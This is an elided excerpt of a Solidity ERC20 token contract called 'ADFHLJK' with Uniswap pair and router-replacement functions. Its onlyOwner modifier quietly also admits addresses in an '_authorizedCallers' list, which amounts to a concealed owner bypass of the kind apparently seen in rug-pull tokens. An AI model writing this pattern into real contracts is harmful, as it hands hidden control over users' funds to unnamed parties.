...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(
            _owner == _msgSender() || _authorizedCallers[_msgSender()],
...
contract ADFHLJK is Context, IERC20, Ownable, ReentrancyGuard {
    ...
    string private _name = "ADFHLJK";
    string private _symbol = "ADFHLJK";
    ...
    function initPair(address payable routerAddress) public onlyOwner {
        IUniswapRouter02 _uniswapRouter = IUniswapRouter02(routerAddress);
        // Create a pair for this new token
        uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(
            address(this),
            _uniswapRouter.WETH()
        );
    ...
    function upgradeSwapRouter(
        ...
        uniswapRouter = IUniswapRouter02(newRouter);
        uniswapPair = newPair;
    }
